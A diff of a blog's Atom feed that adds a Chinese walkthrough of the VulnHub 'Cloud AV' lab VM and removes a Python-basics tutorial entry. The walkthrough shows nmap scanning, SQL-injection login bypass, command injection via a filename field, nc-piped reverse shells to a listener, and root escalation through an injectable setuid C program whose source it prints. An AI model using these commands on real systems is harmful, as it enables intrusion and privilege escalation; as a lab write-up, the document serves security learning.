@@ -338,9 +338,127 @@ module.exports = router;
         <updated>2023-07-13T16:00:00.000Z</updated>
     </entry>
     <entry>
-        <id>https://blog.xcu.icu/2023/07/11/medium_socnet%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/</id>
+        <id>https://blog.xcu.icu/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/</id>
+        <title>记一次easy_cloudantivirus打靶记录</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;上一篇文章记录了我学习 JavaScript 原型链有关的知识点，这里再开台简单的靶机调和一下思路，地址也贴在这里&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm9yZWRoYWNrZXJibG9nLWNsb3VkLWF2LDQ1My8=&#34;&gt; BoredHacker 博客：Cloud AV ~ VulnHub&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;靶机描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#靶机描述&#34;&gt;#&lt;/a&gt; 靶机描述&lt;/h2&gt;
+&lt;p&gt;云反病毒扫描程序！是一种基于云的防病毒扫描服务。&lt;/p&gt;
+&lt;p&gt;目前，它处于测试模式。系统要求您测试设置并查找漏洞并升级隐私。&lt;/p&gt;
+&lt;p&gt;难度：简单&lt;/p&gt;
+&lt;p&gt;涉及的任务：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口扫描&lt;/li&gt;
+&lt;li&gt;网页应用攻击&lt;/li&gt;
+&lt;li&gt;SQL 注入&lt;/li&gt;
+&lt;li&gt;命令注入&lt;/li&gt;
+&lt;li&gt;暴力破解&lt;/li&gt;
+&lt;li&gt;代码分析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;虚拟机：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;格式： 虚拟机 （Virtualbox OVA）&lt;/li&gt;
+&lt;li&gt;操作系统： Linux.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;联网：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP 服务：已启用&lt;/li&gt;
+&lt;li&gt;IP 地址自动分配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;攻击流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击流程&#34;&gt;#&lt;/a&gt; 攻击流程&lt;/h2&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
+&lt;p&gt;这里我都是使用的桥接模式，直接扫描当前网段&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;nmap  192.168.13.0/24 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714150949929.png&#34; alt=&#34;image-20230714150949929&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到开放了 22 和 8080 端口，接下来对端口进行一个服务发现&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;nmap  -p22,8080 -sV 192.168.13.184
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714151232281.png&#34; alt=&#34;image-20230714151232281&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到 8080 上是开放了一个 web 服务，使用了 workzeug 框架，使用的 python 版本 2.7.15&lt;/p&gt;
+&lt;p&gt;接下使用浏览器尝试去访问 8080 端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714151457966.png&#34; alt=&#34;image-20230714151457966&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这是一个云防病毒的查杀服务，这里我们需要有一个邀请码才能正常使用服务，这里能想到的方法有两种暴力破解和注入&lt;/p&gt;
+&lt;p&gt;这里先给火狐浏览器的代理指向 burp 的监听端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714151938572.png&#34; alt=&#34;image-20230714151938572&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714152349789.png&#34; alt=&#34;image-20230714152349789&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里发现输入 &amp;quot; 的时候会抛出一个异常&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714152655817.png&#34; alt=&#34;image-20230714152655817&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h3&gt;
+&lt;p&gt;这里抛出的异常很明显是存在 sql 注入&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153019079.png&#34; alt=&#34;image-20230714153019079&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里使用万能密码就可以，这里直接用浏览器发送请求&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153227998.png&#34; alt=&#34;image-20230714153227998&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这个页面就是一个防病毒的扫描文件了，这里熟悉 linux 的应该第一反应就是这是通过 ll 命令查看到的内容，很显然这些文件就是放在服务端上面的文件，这里我们提交文件名这里后台应该是对我们传入的文件名进行了一些操作，这里猜想可能是命令注入就尝试了一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153823101.png&#34; alt=&#34;image-20230714153823101&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里尝试读取文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153809407.png&#34; alt=&#34;image-20230714153809407&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;能够成功读取，那么很显然这里的逻辑大概是./filename xxx (xxx 是我们传入的文件名，filename 是查杀病毒的可执行文件)&lt;/p&gt;
+&lt;h3 id=&#34;nc反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nc反弹shell&#34;&gt;#&lt;/a&gt; nc 反弹 shell&lt;/h3&gt;
+&lt;p&gt;那么接下来就可以进行反弹 shell，开始我也是用 nc 尝试了半天，但是一直没法成功，这里我也是去问了一下大师傅，才知道有些版本的 nc 是没有 - e 参数的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;cat;nc 192.168.13.249 1234 | /bin/bash | nc 192.168.13.249 2345
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里先通过 nc 监听一个端口，然后通过管道符将第一个连接的后续输入都发送给 /bin/bash，然后将执行的结果通过管道符发送给另一个端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714161309893.png&#34; alt=&#34;image-20230714161309893&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里 1234 端口输入的内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714161330489.png&#34; alt=&#34;image-20230714161330489&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;2345 会输出被 /bin/bash 解析后的内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714161406931.png&#34; alt=&#34;image-20230714161406931&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，这个数据库文件似乎是有点奇怪的，这里使用 file 命令查看一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714162027441.png&#34; alt=&#34;image-20230714162027441&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这是一个 SQLLite 的数据库文件，这里将这个文件 down 下来再本地运行一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714162251815.png&#34; alt=&#34;image-20230714162251815&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里使用 sqlite3 运行这个数据库文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714162512372.png&#34; alt=&#34;image-20230714162512372&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里插入了四条数据到数据库中，这里之前在命令注入的地方查看了 /etc/passwd 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714153809407.png&#34; alt=&#34;image-20230714153809407&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看见只有 root，cloudav 和 scanner 是可以通过 shell 登录系统，这里用这几个用户去尝试 ssh 登录&lt;/p&gt;
+&lt;p&gt;这里分别生成字典然后通过 hydra 尝试登录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714163309903.png&#34; alt=&#34;image-20230714163309903&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;好吧这里并不是登录密码，这里接着去收集信息&lt;/p&gt;
+&lt;p&gt;在上一级目录中发现了一个可能可以利用的文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714163821666.png&#34; alt=&#34;image-20230714163821666&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里很显然，update_cloudav.c 是源码文件，update_cloudav 是可执行文件，他的所有者是 root，且可执行，这里的想法就是执行这个文件，然后进行命令注入&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+int main(int argc, char *argv[]) &amp;#123;
+    char *freshclam = &amp;quot;/usr/bin/freshclam&amp;quot;; // freshclam 命令的路径
+
+    if (argc &amp;lt; 2) &amp;#123;
+        printf(&amp;quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&amp;quot;);
+        return 1;
+    &amp;#125;
+
+    // 构建完整的命令行
+    char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
+    sprintf(command, &amp;quot;%s %s&amp;quot;, freshclam, argv[1]);
+
+    setgid(0); // 设置有效组ID为0，即root用户组
+    setuid(0); // 设置有效用户ID为0，即root用户
+    system(command); // 执行 freshclam 命令
+
+    return 0;
+&amp;#125;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个程序总的来说就如果你有参数就能够正常执行病毒库更新的一个操作，这里还是进行一个命令注入来反弹 shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;./update_cloudav &amp;quot;a;nc 192.168.13.249 6666|/bin/bash|nc 192.168.13.249 7777&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714164840036.png&#34; alt=&#34;image-20230714164840036&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这样就算是成功了&lt;/p&gt;
+</content>
+        <category term="Vulnhub" scheme="https://blog.xcu.icu/categories/Vulnhub/" />
+        <category term="Vulnhub" scheme="https://blog.xcu.icu/tags/Vulnhub/" />
+        <updated>2023-07-13T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://blog.xcu.icu/2023/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%A4%E8%80%81%E7%9A%84%E9%9D%B6%E6%9C%BAmedium_socnet%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
         <title>记一次古老的靶机medium_socnet的打靶记录</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2023/07/11/medium_socnet%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/"/>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%A4%E8%80%81%E7%9A%84%E9%9D%B6%E6%9C%BAmedium_socnet%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
         <content type="html">&lt;h1 id=&#34;medium_socnet靶机记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#medium_socnet靶机记录&#34;&gt;#&lt;/a&gt; medium_socnet 靶机记录&lt;/h1&gt;
 &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
 &lt;p&gt;最近一段时间各种忙，我又各种懒，最后一科课业答辩结束后突然就闲下来了，突然之间不知道该干什么了，找了一个靶机浅浅的玩一下，这里做一个简单的记录，靶机的下载地址是&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm9yZWRoYWNrZXJibG9nLXNvY2lhbC1uZXR3b3JrLDQ1NC8=&#34;&gt;无聊黑客博客： 社交网络～VulnHub&lt;/span&gt;，这个是一个很老的靶机了，所以虽然是中等难度，做起来还是比较轻松的&lt;/p&gt;
@@ -9221,471 +9339,5 @@ if __name__ == &#39;__main__&#39;:
         <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
         <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
         <updated>2023-01-31T16:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2023/01/31/python%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
-        <title>Python安全基础</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2023/01/31/python%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
-        <content type="html">&lt;h2 id=&#34;概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述&#34;&gt;#&lt;/a&gt; 概述&lt;/h2&gt;
-&lt;p&gt;诞生与 1989 年圣诞节期间，吉多・范罗苏姆为了打发时间，而决心开发一款作为 ABC（专门为非专业程序员设计的一种教学语言）的一个继承，与 1991 年发行第一个版本。&lt;/p&gt;
-&lt;p&gt;python 的运用场景：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;人工智能
-&lt;ul&gt;
-&lt;li&gt;机器学习，神经网络，深度学习&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;云计算
-&lt;ul&gt;
-&lt;li&gt;开源云计算解决方案&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;大数据
-&lt;ul&gt;
-&lt;li&gt;数据分析，数据可视化，数据挖掘&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;网络爬虫
-&lt;ul&gt;
-&lt;li&gt;主流爬虫设计语言，Scrapy 框架&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;自动化维护
-&lt;ul&gt;
-&lt;li&gt;selenium&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;web 开发
-&lt;ul&gt;
-&lt;li&gt;web2py 框架&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;科学计算
-&lt;ul&gt;
-&lt;li&gt;NumPy，SciPy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;常规软件开发
-&lt;ul&gt;
-&lt;li&gt;软件开发，脚本编写，网络编程&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;第一个python程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一个python程序&#34;&gt;#&lt;/a&gt; 第一个 python 程序&lt;/h2&gt;
-&lt;p&gt;相比各位学 c 的第一个程序，应该都是打印一个”Hello World“了吧，那 python 的入门我们也从打印 “Hello World” 开始&lt;/p&gt;
-&lt;p&gt;可以从我们的 dos 窗口来执行 python 代码&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126222928427.png&#34; alt=&#34;image-20230126222928427&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;当然也可以使用一些编译器如 PyCharm 或者 vscode 编写程序&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126223140132.png&#34; alt=&#34;image-20230126223140132&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;python的输入输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的输入输出&#34;&gt;#&lt;/a&gt; python 的输入输出&lt;/h2&gt;
-&lt;h3 id=&#34;输入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入&#34;&gt;#&lt;/a&gt; 输入&lt;/h3&gt;
-&lt;p&gt;上面的第一个程序使用的就是一个输出语句&lt;/p&gt;
-&lt;p&gt;printf () 是函数，参数就是要输出的内容，这些内容可以是字符串，数值，列表或者字典等数据类型，输出多个参数使用 &amp;quot;,&amp;quot; 隔开或者使用加号链接&lt;/p&gt;
-&lt;p&gt;注：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;上面两种链接方式，隔开的会有空格，而+链接的没有&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;双引号或者是单引号之间包裹的是字符串常量会按照原样输出，为用引号包裹的是变量，会输出其代表的含义&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;print函数执行后默认换行，如果不需要换行这在其后加上end = &#39;&#39;&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126224138887.png&#34; alt=&#34;image-20230126224138887&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;上面提到换行这里简单说明一下 \n 和 \r 的区别&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&#39;\r&#39; 回车，回到当前行的行首，而不会换到下一行，如果接着输出的话，本行以前的内容会被逐一覆盖；&lt;/li&gt;
-&lt;li&gt;&#39;\n&#39; 换行，换到当前位置的下一行，而不会回到行首；&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输出&#34;&gt;#&lt;/a&gt; 输出&lt;/h3&gt;
-&lt;p&gt;input () 函数是 Python 语言的一个基本输入函数，默认的输入类型为字符串型&lt;/p&gt;
-&lt;p&gt;这个函数的参数会被打印出来&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126225834731.png&#34; alt=&#34;image-20230126225834731&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里默认的数据类型是 string，可以使用类型转换改变数据类型&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126225950928.png&#34; alt=&#34;image-20230126225950928&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;python的注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的注释&#34;&gt;#&lt;/a&gt; python 的注释&lt;/h3&gt;
-&lt;p&gt;这里主要分为多行注释和单行注释&lt;/p&gt;
-&lt;p&gt;单行注释：# 右边的代码不会被执行&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230127190533214.png&#34; alt=&#34;image-20230127190533214&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;多行注释：两组三个连续的单引号或者双引号&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230127190559328.png&#34; alt=&#34;image-20230127190559328&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;python序列控制结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python序列控制结构&#34;&gt;#&lt;/a&gt; python 序列 &amp;amp; 控制结构&lt;/h2&gt;
-&lt;h3 id=&#34;列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#列表&#34;&gt;#&lt;/a&gt; 列表&lt;/h3&gt;
-&lt;p&gt;在 Python 中，序列是最基本的数据结构，相当于 c 中的数组结构。Python 中序列包括列表、元组、字典等。&lt;/p&gt;
-&lt;p&gt;在列表中所有的元素都放在一对 &amp;quot;[]&amp;quot; 中，相邻元素之间使用逗号隔开，例如：[&#39;demo1&#39;,&#39;demo2&#39;]&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;列表的创建&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;直接写成列表的形式写出&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185445030.png&#34; alt=&#34;image-20230128185445030&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;通过 list () 函数将其他类型转化为列表&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185745219.png&#34; alt=&#34;image-20230128185745219&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;列表的删除&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;删除单个元素使用 del，指定列表名和元素名&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185929574.png&#34; alt=&#34;image-20230128185929574&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;删除整个列表，使用 del，指定列表名&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190015177.png&#34; alt=&#34;image-20230128190015177&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;列表末尾添加元素&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;使用 append 函数添加单个元素&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190202762.png&#34; alt=&#34;image-20230128190202762&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;使用 extend 添加一个列表&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190627401.png&#34; alt=&#34;image-20230128190627401&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;指定位置添加元素&lt;/p&gt;
-&lt;p&gt;使用 insert 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190333193.png&#34; alt=&#34;image-20230128190333193&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里第一个差数是插入位置，第二个元素是插入元素&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;删除第一次出现的元素，使用 remove 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205433785.png&#34; alt=&#34;image-20230129205433785&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;删除并返回指定下标的元素，使用 pop 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205831666.png&#34; alt=&#34;image-20230129205831666&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;pop 函数如果没有设置参数则默认删除最后一个元素&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205914061.png&#34; alt=&#34;image-20230129205914061&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;返回指定元素在列表中出现的次数，使用 count 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129210057758.png&#34; alt=&#34;image-20230129210057758&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;对列表逆序&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129210519854.png&#34; alt=&#34;image-20230129210519854&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;对列表进行一个排序，使用 sort 函数，key 参数指定排序依据，reverse 决定升序（False）还是降序（True）&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129211950790.png&#34; alt=&#34;image-20230129211950790&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129212137421.png&#34; alt=&#34;image-20230129212137421&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;元组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元组&#34;&gt;#&lt;/a&gt; 元组&lt;/h3&gt;
-&lt;p&gt;与列表不同的是，元组使用 () 包裹，且属于不可变序列，也就是说，一旦创建后无法进行增删改查的操纵，但是访问速度比列表快，也更加安全&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230129213203088.png&#34; alt=&#34;image-20230129213203088&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;字典&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典&#34;&gt;#&lt;/a&gt; 字典&lt;/h3&gt;
-&lt;p&gt;Python 中的字典不同于在渗透测试中使用的字典，其是包含若干 “键：值” 元素的可变序列，字典中的每一个元素都包含用冒号分开的 “键 &amp;quot; 和 “值”，不同元素之间用逗号隔开，所有元素放在 - 对大括号 “{” 和 “)” 中，另外，需要注意的是字典中的 “键” 不能重复，而 “值” 可以重复&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129213256872.png&#34; alt=&#34;image-20230129213256872&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;前面说到元组不能进行增删改查，但是字典是可以的，而且我个人感觉这个我用的还比较多&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;修改字典中的元素，类似数组的赋值方法去修改，不过这里不使用下标，而是键值，例如：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129213818546.png&#34; alt=&#34;image-20230129213818546&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;为字典添加新元素，像上面一样就可以&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129214743341.png&#34; alt=&#34;image-20230129214743341&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;删除字典中的一个元素，还是使用 del 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215030874.png&#34; alt=&#34;image-20230129215030874&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;删除整个也是同列表一样使用&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215126535.png&#34; alt=&#34;image-20230129215126535&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
